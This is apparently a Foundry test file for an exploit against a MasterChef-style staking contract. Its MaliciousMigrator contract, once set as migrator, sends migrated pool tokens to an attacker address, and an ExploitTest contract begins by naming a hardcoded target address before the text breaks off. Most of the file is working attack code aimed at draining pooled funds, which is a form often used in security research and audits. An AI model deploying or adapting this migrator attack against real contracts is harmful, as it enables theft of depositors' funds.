pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IMasterChef {
    function setMigrator(address _migrator) external;
    function migrate(uint256 pid) external;
    function migrate() external;
    function owner() external view returns (address);
    function poolLength() external view returns (uint256);
    function deposit(uint256 pid, uint256 amount) external;
}

contract MaliciousMigrator {
    address public attacker;
    address public masterChef;

    constructor(address _attacker, address _masterChef) {
        attacker = _attacker;
        masterChef = _masterChef;
    }

    // Called by MasterChef during migration
    function migrate(address token, uint256 amount) external {
        require(msg.sender == masterChef, "Only MasterChef");
        if (amount > 0) {
            IERC20(token).transfer(attacker, amount);
        }
    }

    // Drain all ERC20 tokens
    function drainAll() external {
        // Send native balance
        uint256 nativeBalance = address(this).balance;
        if (nativeBalance > 0) {
            payable(attacker).transfer(nativeBalance);
        }
    }

    receive() external payable {}
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x4B6c8959a41475347226d51f37eC9a1E09F39a92;
